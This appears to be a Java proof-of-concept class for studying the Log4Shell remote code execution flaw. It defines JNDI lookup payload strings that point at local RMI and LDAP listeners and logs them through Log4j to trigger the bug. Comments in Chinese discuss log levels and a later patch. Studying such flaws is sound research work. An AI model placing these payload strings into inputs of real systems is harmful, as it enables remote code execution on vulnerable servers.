package com.venscor.jdni.vul;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author wangyu07 <wangyu07@kuaishou.com>
 * Created on 2022-02-07
 */
public class Log4jRCE {

    private static final Logger LOGGER = LogManager.getLogger(Log4jRCE.class);


    private static final String RMI_PAYLOAD = "${jndi:rmi://127.0.0.1:53424/exp}";

    private static final String LDAP_PAYLOAD = "${jndi:ldap://127.0.0.1:53425/nameNoMatter}";

    private static final String PAYLOAD_FOR_LEARN =
            "${jndi:ldap://127.0.0.1:53425/nameNoMatter}${jndi:ldap://127.0.0.1:53425/nameNoMatter}";

    //https://www.anquanke.com/post/id/201181
    public static void main(String[] args) {


        LOGGER.warn(LDAP_PAYLOAD);

        //log4j的默认日志级别是ERROR，ERROR以下触发不了；
        //2.14.0上测试：见org/apache/logging/log4j/core/config/AbstractConfiguration.java

        //LOGGER.error(RMI_PAYLOAD);

        LOGGER.error(LDAP_PAYLOAD);

        //FIXME:https://github.com/apache/logging-log4j2/commit/001aaada7dab82c3c09cde5f8e14245dc9d8b454#line89
        //在RC1版本中默认关闭了messageLookup功能

    }


}
